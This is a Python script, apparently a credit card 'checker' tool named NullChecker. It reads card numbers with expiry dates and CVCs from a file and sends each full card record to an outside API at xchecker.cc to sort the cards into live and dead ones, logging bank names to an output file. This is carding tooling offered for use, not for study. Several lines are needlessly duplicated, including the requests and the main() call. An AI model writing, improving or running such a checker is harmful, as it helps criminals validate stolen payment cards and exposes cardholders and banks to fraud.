import os, requests, time, urllib3
from datetime import datetime
from termcolor import colored
import colorama
from colorama import Fore
from os import system
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("")
system("setterm -foreground red")
system("figlet NullChecker")
print("")
print(Fore.LIGHTYELLOW_EX + '\033[1;32m💳 v3.1.2 🚀')
time.sleep(2)
print(Fore.LIGHTYELLOW_EX + '\033[1;32mhttps://github.com/Blagdoii/NullChecker <- Beta')
time.sleep(1)
print(Fore.CYAN + ' ')

ccFile = "cc.txt"
outputFile = "cc_checked_{}.txt".format(int(datetime.timestamp(datetime.now())))
checkerAPIURL = "https://www.xchecker.cc/api.php?cc={}|{}|{}|{}"
headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Accept": "*/*",
}
 
def writeFileOutput(data, file, mode="a"):
    f = open(file, mode)
    f.write("{}\n".format(data))
    f.close()
    if "|Live|" in data:
        print(colored(data, "green", attrs=["bold"]))
    elif "|Dead|" in data:
        print(colored(data, "red", attrs=["bold"]))
    else:
        print(colored(data, "yellow", attrs=["bold"]))
 
def main():
    if os.path.exists(ccFile):
        with open(ccFile) as f:
            writeFileOutput("\033[1;37mGurdando resultados: {}".format(outputFile), outputFile)
            for cc in f:
                cc = cc.replace("\r", "").replace("\n", "")
                try:
                    ccNumber = cc.split("|")[0]
                    expMonth = cc.split("|")[1]
                    expYear = cc.split("|")[2]
                    cvc = cc.split("|")[3]
                except:
                    writeFileOutput("{} => Format error. Use ccNumber|expMonth|expYear|cvc".format(cc), outputFile)
                    continue
                url = checkerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                url = checkerAPIURL.format(ccNumber, expMonth, expYear, cvc)
                while True:
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
                        data = response.json()
                        if "ccNumber" in data:
                            output = data["ccNumber"]
                            if "cvc" in data:
                                output = data["cvc"]
                            if "expMonth" in data:
                                output += "|>|" + data["expMonth"]
                                output += "/" + data ["expYear"]
                            output += " |>| " + data["status"] + " |>| " + data["details"]
                            output += " |>| " + data["bankName"]
                        else:
                            output = "{} => {}".format(ccNumber, data["error"])
                        writeFileOutput(output, outputFile)
                        break
                    else:
                        writeFileOutput("HTTP service error: {}, retry...".format(response.status_code), outputFile)
    else:
        print("File {} not found in current directory".format(ccFile))
 
if __name__ == "__main__":
    main()
    main()
 

print("")
print("\033[1;32mDesea continuar usando el programa \033[1;37msi/no")
volver = input("\033[1;37m>>> ")

if volver == "si":
         system("python scream.py")
else:
         print("")
         print("\033[1;37m[+]\033[1;32mSCREAM BIN ,BYE")
         system("sleep 1")
         exit()
